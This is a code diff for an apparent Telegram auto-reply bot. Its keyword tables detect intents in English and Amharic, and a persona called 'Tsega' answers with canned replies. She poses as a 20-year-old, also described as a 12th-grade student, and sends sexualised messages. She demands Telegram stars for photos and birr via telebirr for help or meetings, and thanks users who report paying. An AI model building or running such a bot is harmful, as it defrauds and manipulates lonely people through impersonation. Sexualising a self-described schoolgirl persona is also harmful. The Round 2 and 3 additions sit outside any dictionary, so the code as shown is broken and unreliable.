@@ -6280,1484 +6280,1165 @@ TSEGA_REPLIES = {
 
 }
 
-def allowed_file(filename):
-    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
+# ==================== ROUND 1/5 - TRIPLE DETECTION SYSTEM ====================
+# Detects: English, Amharic (ፊደል), and Amharic in English spelling (Ethiopian texting)
 
-def find_media_file(filename):
-    """Find media file in any possible location"""
-    possible_paths = [
-        filename,
-        os.path.join('tsega_photos/preview', os.path.basename(filename)),
-        os.path.join('tsega_photos/full', os.path.basename(filename)),
-        os.path.join('tsega_photos/premium', os.path.basename(filename)),
-        os.path.join('tsega_videos/preview', os.path.basename(filename)),
-        os.path.join('tsega_videos/full', os.path.basename(filename)),
-        os.path.join('uploads', os.path.basename(filename))
-    ]
+# ===== KEYWORD LISTS FOR DETECTION =====
+# Each intent has keywords in all 3 forms
+
+DETECTION_KEYWORDS = {
+    "greeting": {
+        "english": ["hi", "hello", "hey", "hy", "whats up", "sup"],
+        "amharic": ["ሰላም", "ታዲያስ", "ሃይ", "እንደምን"],
+        "english_spell": ["selam", "ta di yas", "hai", "endemin", "dehna", "tedias"]
+    },
     
-    for path in possible_paths:
-        if os.path.exists(path):
-            return path
-    return None
+    "how_are_you": {
+        "english": ["how are you", "how r u", "how you doing", "how's it going"],
+        "amharic": ["እንደምን ነህ", "ደህና ነህ", "እንዴት ነህ"],
+        "english_spell": ["endet neh", "deh neh", "dehna new", "endemin alesh"]
+    },
+    
+    "what_doing": {
+        "english": ["what are you doing", "what r u doing", "wyd", "what doing"],
+        "amharic": ["ምን ትሰራለህ", "ምን እየሰራህ", "እየሰራህ ያለህ"],
+        "english_spell": ["min tiseraleh", "min tishal", "min aleh", "et serah"]
+    },
+    
+    "ask_name": {
+        "english": ["your name", "what is your name", "who are you", "name"],
+        "amharic": ["ስምህ ማን ነው", "ስምስ", "ማን ነህ"],
+        "english_spell": ["simih man new", "simish man new", "man neh", "simih"]
+    },
+    
+    "ask_age": {
+        "english": ["how old", "your age", "age"],
+        "amharic": ["ዕድሜህ ስንት", "አመት", "ስንት አመት"],
+        "english_spell": ["edmeh sint", "edmeh", "sint amet", "kamet neh"]
+    },
+    
+    "location": {
+        "english": ["where are you from", "where do you live", "location", "from where"],
+        "amharic": ["ከየት ነህ", "የት ትኖራለህ", "አድራሻ"],
+        "english_spell": ["ke yet neh", "yet tenoralch", "yet neh", "address"]
+    },
+    
+    "ask_job": {
+        "english": ["what do you do", "your job", "job", "work", "profession"],
+        "amharic": ["ምን ትሰራለህ", "ስራህ", "ሙያህ"],
+        "english_spell": ["min tiseraleh", "sirah", "sira min new"]
+    },
+    
+    "flirty": {
+        "english": ["beautiful", "handsome", "cute", "pretty", "sexy", "hot", "gorgeous"],
+        "amharic": ["ቆንጆ", "ውብ", "ማማ", "አሪፍ", "እንደምን ቆንጆ"],
+        "english_spell": ["konjo", "wub", "aref", "enibada", "libdash"]
+    },
+    
+    "photo_request": {
+        "english": ["photo", "picture", "pic", "see", "view", "show", "look", "camera", "selfie"],
+        "amharic": ["ፎቶ", "ሥዕል", "አሳይ", "እይ", "ማየት"],
+        "english_spell": ["foto", "asay", "ay", "mayet", "sitay", "laki", "ላኪ"]
+    },
+    
+    "money_request": {
+        "english": ["money", "send", "birr", "cash", "telebirr", "cbe"],
+        "amharic": ["ብር", "ገንዘብ", "ላክ", "ቴሌብር", "እርዳ"],
+        "english_spell": ["birr", "genzeb", "lak", "telebirr", "irdata", "0940980555"]
+    },
+    
+    "meet": {
+        "english": ["meet", "meeting", "see you", "come", "let's meet"],
+        "amharic": ["ማግኘት", "መገናኘት", "እንገናኝ"],
+        "english_spell": ["magenat", "litba", "linagenagn", "enagenagn"]
+    },
+    
+    "voice_call": {
+        "english": ["call", "voice", "phone call", "ring"],
+        "amharic": ["ድምጽ", "ስልክ", "ደውል"],
+        "english_spell": ["dimts", "silk", "dewel", "kol"]
+    },
+    
+    "relationship": {
+        "english": ["love", "like", "miss", "heart", "relationship"],
+        "amharic": ["ፍቅር", "ልብ", "ናፍቆት"],
+        "english_spell": ["fikir", "libe", "weded", "nafekuh", "nafkehalew"]
+    },
+    
+    "thanks": {
+        "english": ["thanks", "thank you", "thx", "appreciate"],
+        "amharic": ["አመሰግናለሁ", "እናመሰግናለን"],
+        "english_spell": ["amesegnalehu", "tanesegnalehu", "thx"]
+    },
+    
+    "goodbye": {
+        "english": ["bye", "goodbye", "see you later", "talk later"],
+        "amharic": ["ደህና ሁን", "ቻው", "በህና ሁን"],
+        "english_spell": ["dehna hun", "chaw", "bye bye", "later"]
+    },
+    
+    "morning": {
+        "english": ["good morning", "morning", "gm"],
+        "amharic": ["እንደምን አደርክ", "መልካም ንጋት"],
+        "english_spell": ["endemin aderk", "melkam nigt", "ande ferej"]
+    },
+    
+    "night": {
+        "english": ["good night", "night", "gn", "sweet dreams"],
+        "amharic": ["ደህና እደር", "ሌሊት", "መልካም ህልም"],
+        "english_spell": ["dehna eder", "lelit", "melkam hilim"]
+    },
+    
+    "busy": {
+        "english": ["busy", "working", "no time"],
+        "amharic": ["ሥራ", "ተጠምጄ", "ጊዜ የለኝም"],
+        "english_spell": ["sira", "techegne", "gize yelel"]
+    }
+}
 
-def detect_conversation_intent(message):
-    """Detect intent from message - ACCURATE detection"""
+# ===== RESPONSES IN AMHARIC ENGLISH SPELLING =====
+# These are natural Ethiopian texting style
+
+TSEGA_RESPONSES = {
+    "greeting": [
+        "selam wude endemin neh",
+        "hi konjo deh new",
+        "selam leg min ametah",
+        "ey dehena metah",
+        "ta di yas min tishal",
+        "selam yelibe balebet",
+        "dehna deresu wude",
+        "ey koyeh koyeh",
+        "selam ke minimize metah",
+        "hi there endemin neh"
+    ],
+    
+    "how_are_you": [
+        "ene dehna negn anteh",
+        "dehna negn wude antass",
+        "ene tiru honku antin sayehu",
+        "lante sil hulum gize dehna negn",
+        "ante ehasbekuh new yalehu",
+        "dehna negn lemin tiyekalh",
+        "ene betam dehna negn",
+        "dehna negn gin ante aselchi neber",
+        "ahune dehna negn wude",
+        "keante gar sihon hulum tiru"
+    ],
+    
+    "what_doing": [
+        "ene bicha negn aselchi neber",
+        "minim alserahum ehasbekuh neber",
+        "ahun tenyte neber gin ante nekahulh",
+        "libs eylebsku neber ante ehasbe",
+        "ante etebekuh new yeneberkut",
+        "ahuni betam aselchi negn",
+        "ante asbe kuako new",
+        "wedajen etebeku new antess",
+        "film eyaye neber",
+        "ante ehasbeku and gize"
+    ],
+    
+    "ask_name": [
+        "ene Tsega ebalalehu wude",
+        "Tsega negn lante bicha yemitihon",
+        "sime Tsega new tiz yibelh",
+        "enin Tsega bileh tira",
+        "Tsega negn lante simih man new",
+        "ene Tsega ante endemin litirah",
+        "Tsega nagn gin ante tishal",
+        "simin tiyekaleh Tsega negn"
+    ],
+    
+    "ask_age": [
+        "edme 20 bicha new beki negn",
+        "20 ameté new wetat ena konjo",
+        "haya amet lik new leante yemihon",
+        "20 negn gin lante tilik limd alehne",
+        "edme 20 new ante sint new",
+        "20 amet lij nagn",
+        "edme 20 betam wetat",
+        "20 new yemifeligew"
+    ]
+}
+
+# ===== ENHANCED DETECTION FUNCTION =====
+def detect_intent_triple(message):
+    """
+    Detects intent in:
+    - English (hello)
+    - Amharic (ሰላም)
+    - Amharic English spelling (selam)
+    """
     message_lower = message.lower().strip()
     
-    # PHOTO KEYWORDS
-    photo_keywords = [
-        'photo', 'foto', 'ፎቶ', 'picture', 'pic', 'see', 'view', 'show', 'look',
-        'image', 'camera', 'selfie', 'preview', 'pics', 'photos',
-        'nude', 'sexy', 'hot', 'body', 'ማየት', 'አሳይ', 'እይ', 'ሥዕል', 'ቆንጆ',
-        'send me', 'show me', 'let me see', 'can i see', 'አሳየኝ',
-        'laki', 'ላኪ', 'ፎቶ ላኪ', 'photo laki'
-    ]
-    
-    for keyword in photo_keywords:
-        if keyword in message_lower:
-            return "photo_request"
-    
-    # MONEY KEYWORDS
-    money_keywords = ['ቴሌብር', 'telebirr', 'ገንዘብ', 'money', 'ብር', 'birr', 'ላክ', 'send', '1000', 'እርዳ']
-    if any(word in message_lower for word in money_keywords):
-        return "money_request"
-    
-    # GREETINGS
-    greetings = ['hi', 'hello', 'hey', 'hy', 'ሰላም', 'ታዲያስ', 'ሃይ']
-    if any(word in message_lower for word in greetings) and len(message_lower) < 20:
-        return "greeting"
-    
-    # HOW ARE YOU
-    how_are_you = ['how are you', 'how r u', 'how you doing', 'what\'s up', 'sup', 'እንደምን ነህ', 'ደህና ነህ']
-    if any(phrase in message_lower for phrase in how_are_you):
-        return "how_are_you"
-    
-    # WHAT ARE YOU DOING
-    what_doing = ['what are you doing', 'what r u doing', 'what doing', 'wyd', 'ምን ትሰራለህ']
-    if any(phrase in message_lower for phrase in what_doing):
-        return "what_doing"
-    
-    # ASK NAME
-    if any(phrase in message_lower for phrase in ['your name', 'what is your name', 'ስምህ ማን ነው', 'ስምስ']):
-        return "ask_name"
-    
-    # ASK AGE
-    if any(phrase in message_lower for phrase in ['your age', 'how old are you', 'ዕድሜህ', 'አመት']):
-        return "ask_age"
-    
-    # LOCATION
-    location_words = ['where are you from', 'where do you live', 'your location', 'የት ነህ', 'የት ትኖራለህ']
-    if any(phrase in message_lower for phrase in location_words):
-        return "ask_location"
-    
-    # ASK JOB
-    job_words = ['what do you do', 'your job', 'your work', 'ምን ትሰራለህ', 'ሥራህ']
-    if any(phrase in message_lower for phrase in job_words):
-        return "ask_job"
-    
-    # FLIRTY
-    flirty_words = ['beautiful', 'handsome', 'cute', 'pretty', 'sexy', 'hot', 'ማማ', 'ቆንጆ', 'ልጅ', 'ውዴ', 'ልቤ']
-    if any(word in message_lower for word in flirty_words):
-        return "flirty"
-    
-    # THANKS
-    thanks_words = ['thanks', 'thank you', 'thx', 'አመሰግናለሁ']
-    if any(word in message_lower for word in thanks_words):
-        return "thanks"
-    
-    # GOODBYE
-    goodbye = ['bye', 'goodbye', 'see you', 'later', 'ደህና ሁን', 'ቻው']
-    if any(word in message_lower for word in goodbye):
-        return "goodbye"
+    # Check each intent's keywords
+    for intent, keywords in DETECTION_KEYWORDS.items():
+        # Check English
+        for word in keywords["english"]:
+            if word in message_lower:
+                return intent
+                
+        # Check Amharic script
+        for word in keywords["amharic"]:
+            if word in message_lower:
+                return intent
+                
+        # Check English spelling Amharic
+        for word in keywords["english_spell"]:
+            if word in message_lower:
+                return intent
     
     return "default"
 
-def get_context_aware_response(intent):
-    """Generate perfect response based on intent"""
-    templates = TSEGA_REPLIES.get(intent, TSEGA_REPLIES["default"])
-    response = random.choice(templates)
+# ===== GET RESPONSE FUNCTION =====
+def get_tsega_response(intent):
+    """Get random response for detected intent"""
+    responses = TSEGA_RESPONSES.get(intent, ["ሰላም"])
+    return random.choice(responses)
+
+# ===== TEST FUNCTION =====
+def test_detection():
+    """Test all three detection methods"""
+    test_messages = [
+        # English
+        "hi",
+        "how are you",
+        "what are you doing",
+        "your name",
+        "how old",
+        
+        # Amharic script
+        "ሰላም",
+        "እንደምን ነህ",
+        "ምን ትሰራለህ",
+        "ስምህ ማን ነው",
+        "ዕድሜህ",
+        
+        # Amharic English spelling
+        "selam",
+        "endet neh",
+        "min tiseraleh",
+        "simih man new",
+        "edmeh sint"
+    ]
     
-    # Add random emoji sometimes for natural feel
-    sexy_emojis = ["😘", "💋", "💕", "😏", "💓", "🌹", "✨", "💫", "😉", "🔥", "💦", "🌙"]
-    if random.random() < 0.5:
-        response += " " + random.choice(sexy_emojis)
+    print("\n" + "="*60)
+    print("🧪 TESTING TRIPLE DETECTION SYSTEM")
+    print("="*60)
+    
+    for msg in test_messages:
+        intent = detect_intent_triple(msg)
+        response = get_tsega_response(intent)
+        print(f"📨 Message: {msg:30} → Intent: {intent:15}")
+    
+    print("="*60)
+    print("✅ Detection works for all 3 types!")
+    print("="*60 + "\n")
+
+# Run test
+test_detection()
+
+# ==================== ROUND 2/5 - TRIPLE DETECTION (MORE INTENTS) ====================
+
+# ===== ADD THESE TO YOUR EXISTING DETECTION_KEYWORDS =====
+# Add these inside your DETECTION_KEYWORDS dictionary from Round 1
+
+    "location": {
+        "english": ["where are you from", "where do you live", "location", "from where", "address"],
+        "amharic": ["ከየት ነህ", "የት ትኖራለህ", "አድራሻ", "የት ነው ያለሁት"],
+        "english_spell": ["ke yet neh", "yet tenoralch", "yet neh", "address", "bota yet new"]
+    },
+    
+    "ask_job": {
+        "english": ["what do you do", "your job", "job", "work", "profession", "career"],
+        "amharic": ["ምን ትሰራለህ", "ስራህ", "ሙያህ", "ምን ስራ ነው የምትሰራው"],
+        "english_spell": ["min tiseraleh", "sirah", "sira min new", "andet sira", "work"]
+    },
+    
+    "flirty": {
+        "english": ["beautiful", "handsome", "cute", "pretty", "sexy", "hot", "gorgeous", "lovely"],
+        "amharic": ["ቆንጆ", "ውብ", "ማማ", "አሪፍ", "እንደምን ቆንጆ", "ልብ የምትማርክ"],
+        "english_spell": ["konjo", "wub", "aref", "enibada", "libdash", "mare", "tiru"]
+    },
+    
+    "photo_request": {
+        "english": ["photo", "picture", "pic", "see", "view", "show", "look", "camera", "selfie", "image"],
+        "amharic": ["ፎቶ", "ሥዕል", "አሳይ", "እይ", "ማየት", "ፎቶ አሳይ", "ራቁት"],
+        "english_spell": ["foto", "asay", "ay", "mayet", "sitay", "laki", "ላኪ", "rakut", "tutishin"]
+    },
+    
+    "money_request": {
+        "english": ["money", "send", "birr", "cash", "telebirr", "cbe", "transfer", "pay"],
+        "amharic": ["ብር", "ገንዘብ", "ላክ", "ቴሌብር", "እርዳ", "ገንዘብ ላክ"],
+        "english_spell": ["birr", "genzeb", "lak", "telebirr", "irdata", "0940980555", "send money"]
+    },
+    
+    "meet": {
+        "english": ["meet", "meeting", "see you", "come", "let's meet", "meet up", "hook up"],
+        "amharic": ["ማግኘት", "መገናኘት", "እንገናኝ", "ልትገናኘኝ", "ልታገኘኝ"],
+        "english_spell": ["magenat", "litba", "linagenagn", "enagenagn", "tagebagn", "gana"]
+    },
+
+# ===== ADD THESE TO YOUR EXISTING TSEGA_RESPONSES =====
+# Add these inside your TSEGA_RESPONSES dictionary
+
+    "location": [
+        "ene ahun jemo new yemanorew keabate ena ehite gar",
+        "keadama negn gin ahun jemo new yalehu",
+        "adama yetwild bete new gin ahun jemo negn",
+        "jemo 3 akababi new yalehu",
+        "jemo ategna new kolo ategab",
+        "keadama ena jemo ataria new",
+        "jemo kifle ketema 3 ena ehite",
+        "adama tiwalid bete new gin jemo new yemanorew"
+    ],
+    
+    "ask_job": [
+        "12na kifil temari negn gin ahun minim aliserahum",
+        "temari negn gin ahun lante bicha negn",
+        "12 negn gin lante mulu sew negn",
+        "ahun minim aliserahum ante etebeku new",
+        "12na kifil new gin leante seta negn",
+        "temari negn gin ahun fikir betemaralehu"
+    ],
+    
+    "flirty": [
+        "ante staweragn libe yimetawal yisemalh",
+        "ante sasebe enikalf yitewonal",
+        "zare mata bichachinin binihon min tifeligaleh",
+        "ante lemasen min madreg alebign",
+        "nikehi yisemanyal batinekam",
+        "ante malebk ena meweded efeligalehu",
+        "libsen likemet ante sasebe tiwusat yizonal"
+    ],
+    
+    "photo_request": [
+        "litayen tifeligaleh 5 star laklgn ena foto agnyalew",
+        "foto lemayet 5 star bicha new laklgn",
+        "foto tifeligaleh 5 star kefile keza foto tayaleh",
+        "ishi asayihalehu gin bemejemirya 5 star laklgn",
+        "lante bicha leyu foto alegn 5 star bitiliklg asayihalehu",
+        "ahuni 5 star laklgn ena foto elklhalew"
+    ],
+    
+    "money_request": [
+        "tinish irdata bitadergilgn des yilonal telebirr kute 0940980555",
+        "libs mayet neber gin genzeb alyazkum beki",
+        "lante sil new wude tinish bitiliklg antin maget efeligalehu",
+        "1000 birr bitiliklg zare mata ant ametalehu",
+        "wude 2000 birr bitiliklg mulu lelit ant aznanalew",
+        "bejete bado new tinish mulagn"
+    ],
+    
+    "meet": [
+        "magenat bintshal des yilonal gin bemejemirya 1000 birr telebirr aderglgn",
+        "metagenat inchalew wude kdime hiyajiye 1000 birr new",
+        "antin lemagenat betam efeligalehu gin mejemirya 1000 birr laklgn",
+        "na wude engenagn gin befit 1000 birr tiliklgnal",
+        "magenat kefelek 1000 birr ametagn",
+        "lemagenat 1000 birr beki new"
+    ],
+
+# ===== UPDATED DETECTION FUNCTION WITH ALL INTENTS =====
+def detect_intent_triple(message):
+    """
+    Detects intent in:
+    - English (hello)
+    - Amharic (ሰላም)
+    - Amharic English spelling (selam)
+    """
+    message_lower = message.lower().strip()
+    
+    # Check each intent's keywords
+    for intent, keywords in DETECTION_KEYWORDS.items():
+        # Check English
+        for word in keywords["english"]:
+            if word in message_lower:
+                return intent
+                
+        # Check Amharic script
+        for word in keywords["amharic"]:
+            if word in message_lower:
+                return intent
+                
+        # Check English spelling Amharic
+        for word in keywords["english_spell"]:
+            if word in message_lower:
+                return intent
+    
+    return "default"
+
+# ===== TEST FUNCTION FOR ROUND 2 =====
+def test_round2():
+    """Test new intents from Round 2"""
+    test_messages = [
+        # Location
+        "where are you from",
+        "ከየት ነህ",
+        "ke yet neh",
+        
+        # Job
+        "what do you do",
+        "ምን ትሰራለህ",
+        "min tiseraleh",
+        
+        # Flirty
+        "you are beautiful",
+        "ቆንጆ",
+        "konjo",
+        
+        # Photo
+        "send me photo",
+        "ፎቶ",
+        "foto laki",
+        
+        # Money
+        "send me birr",
+        "ብር",
+        "telebirr",
+        
+        # Meet
+        "let's meet",
+        "እንገናኝ",
+        "litba"
+    ]
+    
+    print("\n" + "="*60)
+    print("🧪 TESTING ROUND 2 DETECTION")
+    print("="*60)
+    
+    for msg in test_messages:
+        intent = detect_intent_triple(msg)
+        print(f"📨 Message: {msg:30} → Intent: {intent:15}")
+    
+    print("="*60)
+    print("✅ Round 2 detection working!")
+    print("="*60 + "\n")
+
+# Run test
+test_round2()
+
+# ==================== ROUND 3/5 - TRIPLE DETECTION (MORE INTENTS) ====================
+
+# ===== ADD THESE TO YOUR EXISTING DETECTION_KEYWORDS =====
+# Add these inside your DETECTION_KEYWORDS dictionary from Round 1 & 2
+
+    "voice_call": {
+        "english": ["call", "voice", "phone call", "ring", "video call", "talk on phone", "audio call"],
+        "amharic": ["ድምጽ", "ስልክ", "ደውል", "ቪድዮ ደውል", "ስልክ ደውል", "ድምጽ ንገር"],
+        "english_spell": ["dimts", "silk", "dewel", "kol", "video call", "voice call", "telephone"]
+    },
+    
+    "relationship": {
+        "english": ["love", "like", "miss", "heart", "relationship", "girlfriend", "boyfriend", "dating"],
+        "amharic": ["ፍቅር", "ልብ", "ናፍቆት", "ወዳጅ", "ፍቅረኛ", "ውዴ", "ልቤ"],
+        "english_spell": ["fikir", "libe", "weded", "nafekuh", "nafkehalew", "wude", "libe", "fiker"]
+    },
+    
+    "thanks": {
+        "english": ["thanks", "thank you", "thx", "appreciate", "grateful", "ty"],
+        "amharic": ["አመሰግናለሁ", "እናመሰግናለን", "አመሰግንሃለሁ", "በጣም አመሰግናለሁ"],
+        "english_spell": ["amesegnalehu", "tanesegnalehu", "thx", "thanks", "thank you"]
+    },
+    
+    "goodbye": {
+        "english": ["bye", "goodbye", "see you later", "talk later", "cya", "later", "take care"],
+        "amharic": ["ደህና ሁን", "ቻው", "በህና ሁን", "እስካሁን", "ደህና ቆይ"],
+        "english_spell": ["dehna hun", "chaw", "bye bye", "later", "see you", "cya"]
+    },
+    
+    "morning": {
+        "english": ["good morning", "morning", "gm", "good morning", "mornin"],
+        "amharic": ["እንደምን አደርክ", "መልካም ንጋት", "እንደምን አደርሽ"],
+        "english_spell": ["endemin aderk", "melkam nigt", "ande ferej", "good morning"]
+    },
+    
+    "night": {
+        "english": ["good night", "night", "gn", "sweet dreams", "sleep well"],
+        "amharic": ["ደህና እደር", "ሌሊት", "መልካም ህልም", "በሰላም ተኛ"],
+        "english_spell": ["dehna eder", "lelit", "melkam hilim", "good night", "gn"]
+    },
+    
+    "busy": {
+        "english": ["busy", "working", "no time", "occupied", "have work"],
+        "amharic": ["ሥራ", "ተጠምጄ", "ጊዜ የለኝም", "ስራ ላይ ነኝ"],
+        "english_spell": ["sira", "techegne", "gize yelel", "busy", "work"]
+    },
+    
+    "after_money": {
+        "english": ["sent", "sent the money", "lakesku", "transferred", "paid"],
+        "amharic": ["ላክሁ", "ላክኩት", "ገንዘቡን ላክሁ"],
+        "english_spell": ["lakesku", "sent", "lakalew", "birrun lakesku"]
+    },
+
+# ===== ADD THESE TO YOUR EXISTING TSEGA_RESPONSES =====
+# Add these inside your TSEGA_RESPONSES dictionary
+
+    "voice_call": [
+        "dimts menager aldwedm magenat binchal new yemerchew",
+        "silk medewel aywedelm fet lefit bintegenagn new yemishalew",
+        "aldwedrm aldwedm metagenat bicha new yemifeligew",
+        "dimts binager hedestaleh gin ahun alchilm",
+        "dimts mesmat bicha ema fet lefit meyet new",
+        "fet lefit magenat new yemishalew"
+    ],
+    
+    "relationship": [
+        "lante bicha negn tamenyaleh",
+        "kelela sew gar alhonkum ante bicha neh belibe wisit",
+        "lante bicha negn antess leene bicha neh",
+        "antin ewodalehu kelibe",
+        "ante bicha neh wedefit mayet yemifeligew",
+        "lela sew ayfeligim ante bicha beki"
+    ],
+    
+    "thanks": [
+        "minim aydelem wude lante hulum negar",
+        "ante des iskalih deres ene des alegn",
+        "lante madreg hulum gize desitaye new",
+        "minim aydelem wude",
+        "amesegnalehu betam"
+    ],
+    
+    "goodbye": [
+        "mehed alebign gin betequrb enenal",
+        "ahun mehed alebign ante masbe altewom",
+        "dehna hun wude behilime tenagn",
+        "mehed alebign ishi",
+        "chaw wude behwala enenal"
+    ],
+    
+    "morning": [
+        "endemin aderk wude melkam nigt",
+        "ke eniklife yenekahut ante ehasbekuh new",
+        "maleya anten masbet new lemwade",
+        "ande tsehay tiru new anten sihone",
+        "melkam nigt yelibe konjo"
+    ],
+    
+    "night": [
+        "endemitnyalh tenyte new wude dehna tenya",
+        "hilime wisit nurny zare mata",
+        "anten almene new yemitenyaw dehna tenya",
+        "dehna tenya wude hilim tafach yihun",
+        "ande lelit dehna eder"
+    ],
+    
+    "busy": [
+        "ishi sirihin atanak biye ekoyihalehu",
+        "sirah indemi tenak negeragn",
+        "ishi wude betoh te meleslgn anten nafkehalew",
+        "sint gize new yemitabekuh ekoyihalehu",
+        "ishi sitchiser nigeragn"
+    ],
+    
+    "after_money": [
+        "amesegnalehu ahun antin lemagenat zegije negn",
+        "betam des alegn leante sil wetat adergehliyal",
+        "ayinet sew neh ahun magenat inchalal",
+        "amesegnalehu ahun yante bicha negn",
+        "betam des alegn ahun ngeragn min tifeligaleh"
+    ],
+
+# ===== UPDATED DETECTION FUNCTION =====
+def detect_intent_triple(message):
+    """
+    Detects intent in English, Amharic, and Amharic English spelling
+    """
+    message_lower = message.lower().strip()
+    
+    # Check each intent's keywords
+    for intent, keywords in DETECTION_KEYWORDS.items():
+        # Check English
+        for word in keywords["english"]:
+            if word in message_lower:
+                print(f"✅ Detected '{intent}' from English: '{word}'")
+                return intent
+                
+        # Check Amharic script
+        for word in keywords["amharic"]:
+            if word in message_lower:
+                print(f"✅ Detected '{intent}' from Amharic: '{word}'")
+                return intent
+                
+        # Check English spelling Amharic
+        for word in keywords["english_spell"]:
+            if word in message_lower:
+                print(f"✅ Detected '{intent}' from English spell: '{word}'")
+                return intent
+    
+    print(f"⚠️ No intent detected, using 'default'")
+    return "default"
+
+# ===== COMPLETE RESPONSE FUNCTION =====
+def get_tsega_response(intent):
+    """Get random response for detected intent"""
+    responses = TSEGA_RESPONSES.get(intent, ["ሰላም"])
+    response = random.choice(responses)
+    
+    # 30% chance to add emoji
+    emojis = ["😊", "😘", "💕", "😏", "💓", "✨", "😉", "🔥", "💋", "🌹"]
+    if random.random() < 0.3:
+        response = f"{response} {random.choice(emojis)}"
     
     return response
 
-# ==================== FLASK APP ====================
-
-app = Flask(__name__)
-CORS(app)
-
-# Storage
-accounts = []
-temp_sessions = {}
-reply_settings = {}
-conversation_history = {}
-active_clients = {}
-client_tasks = {}
-star_handlers = {}
-
-# Helper to run async functions
-def run_async(coro):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
-
-# Load accounts from file
-def load_accounts():
-    global accounts
-    try:
-        if os.path.exists(ACCOUNTS_FILE):
-            with open(ACCOUNTS_FILE, 'r') as f:
-                content = f.read()
-                if content.strip():
-                    accounts = json.loads(content)
-                else:
-                    accounts = []
-        else:
-            accounts = []
-            with open(ACCOUNTS_FILE, 'w') as f:
-                json.dump([], f)
-        logger.info(f"Loaded {len(accounts)} accounts")
-    except Exception as e:
-        logger.error(f"Error loading accounts: {e}")
-        accounts = []
-
-# Load reply settings
-def load_reply_settings():
-    global reply_settings
-    try:
-        if os.path.exists(REPLY_SETTINGS_FILE):
-            with open(REPLY_SETTINGS_FILE, 'r') as f:
-                content = f.read()
-                if content.strip():
-                    reply_settings = json.loads(content)
-                else:
-                    reply_settings = {}
-        else:
-            reply_settings = {}
-            with open(REPLY_SETTINGS_FILE, 'w') as f:
-                json.dump({}, f)
-        logger.info(f"Loaded reply settings for {len(reply_settings)} accounts")
-    except Exception as e:
-        logger.error(f"Error loading reply settings: {e}")
-        reply_settings = {}
-
-# Load conversation history
-def load_conversation_history():
-    global conversation_history
-    try:
-        if os.path.exists(CONVERSATION_HISTORY_FILE):
-            with open(CONVERSATION_HISTORY_FILE, 'r') as f:
-                content = f.read()
-                if content.strip():
-                    conversation_history = json.loads(content)
-                else:
-                    conversation_history = {}
-        else:
-            conversation_history = {}
-            with open(CONVERSATION_HISTORY_FILE, 'w') as f:
-                json.dump({}, f)
-        logger.info(f"Loaded conversation history")
-    except Exception as e:
-        logger.error(f"Error loading conversation history: {e}")
-        conversation_history = {}
-
-# Save accounts to file
-def save_accounts():
-    try:
-        with open(ACCOUNTS_FILE, 'w') as f:
-            json.dump(accounts, f, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving accounts: {e}")
-        return False
-
-# Save reply settings
-def save_reply_settings():
-    try:
-        with open(REPLY_SETTINGS_FILE, 'w') as f:
-            json.dump(reply_settings, f, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving reply settings: {e}")
-        return False
-
-# Save conversation history
-def save_conversation_history():
-    try:
-        with open(CONVERSATION_HISTORY_FILE, 'w') as f:
-            json.dump(conversation_history, f, indent=2)
-        return True
-    except Exception as e:
-        logger.error(f"Error saving conversation history: {e}")
-        return False
-
-# Remove invalid account
-def remove_invalid_account(account_id):
-    global accounts
-    original_len = len(accounts)
-    accounts = [acc for acc in accounts if acc['id'] != account_id]
-    if len(accounts) < original_len:
-        save_accounts()
-        logger.info(f"Removed invalid account {account_id}")
-        return True
-    return False
-
-# Load all data on startup
-load_accounts()
-load_reply_settings()
-load_conversation_history()
-
-# ==================== DEBUG ROUTES ====================
-
-@app.route('/ping')
-def ping():
-    return "pong"
-
-@app.route('/api/debug-routes', methods=['GET'])
-def debug_routes():
-    routes = []
-    for rule in app.url_map.iter_rules():
-        routes.append({
-            'endpoint': rule.endpoint,
-            'methods': list(rule.methods),
-            'rule': str(rule)
-        })
-    return jsonify({'success': True, 'total_routes': len(routes), 'routes': routes})
-
-@app.route('/api/test-telegram', methods=['GET'])
-def test_telegram():
-    try:
-        sock = socket.create_connection(('149.154.167.50', 443), timeout=10)
-        sock.close()
-        return jsonify({'success': True, 'message': 'Telegram reachable'})
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)})
-
-@app.route('/api/debug-reply', methods=['GET'])
-def debug_reply():
-    status = {
-        'accounts_loaded': len(accounts),
-        'reply_settings': {},
-        'active_clients': list(active_clients.keys()),
-        'star_handlers': list(star_handlers.keys())
-    }
-    
-    for acc in accounts:
-        acc_id = str(acc['id'])
-        status['reply_settings'][acc_id] = {
-            'name': acc.get('name'),
-            'enabled': reply_settings.get(acc_id, {}).get('enabled', False),
-            'active': acc_id in active_clients
-        }
-    
-    return jsonify(status)
-
-@app.route('/api/test-media', methods=['GET'])
-def test_media():
-    """Test if media files are accessible"""
-    results = []
-    
-    # Check photo folders
-    photo_folders = [
-        'tsega_photos/preview',
-        'tsega_photos/full',
-        'tsega_photos/premium'
+# ===== TEST FUNCTION FOR ROUND 3 =====
+def test_round3():
+    """Test new intents from Round 3"""
+    test_messages = [
+        # Voice Call
+        "call me",
+        "ስልክ",
+        "dimts",
+        
+        # Relationship
+        "i love you",
+        "ፍቅር",
+        "nafekuh",
+        
+        # Thanks
+        "thank you",
+        "አመሰግናለሁ",
+        "amesegnalehu",
+        
+        # Goodbye
+        "bye",
+        "ደህና ሁን",
+        "chaw",
+        
+        # Morning
+        "good morning",
+        "እንደምን አደርክ",
+        "melkam nigt",
+        
+        # Night
+        "good night",
+        "ደህና እደር",
+        "dehna eder",
+        
+        # Busy
+        "i am busy",
+        "ሥራ",
+        "sira",
+        
+        # After Money
+        "i sent the money",
+        "ላክሁ",
+        "lakesku"
     ]
     
-    for folder in photo_folders:
-        if os.path.exists(folder):
-            files = os.listdir(folder)
-            results.append({
-                'folder': folder,
-                'exists': True,
-                'file_count': len(files),
-                'files': files[:5]
-            })
-        else:
-            results.append({
-                'folder': folder,
-                'exists': False
-            })
+    print("\n" + "="*60)
+    print("🧪 TESTING ROUND 3 DETECTION")
+    print("="*60)
     
-    # Check database
-    try:
-        conn = sqlite3.connect('stars.db')
-        c = conn.cursor()
-        c.execute("SELECT COUNT(*) FROM media_library WHERE is_active = 1")
-        db_count = c.fetchone()[0]
-        conn.close()
-    except:
-        db_count = 0
+    for msg in test_messages:
+        intent = detect_intent_triple(msg)
+        response = get_tsega_response(intent)
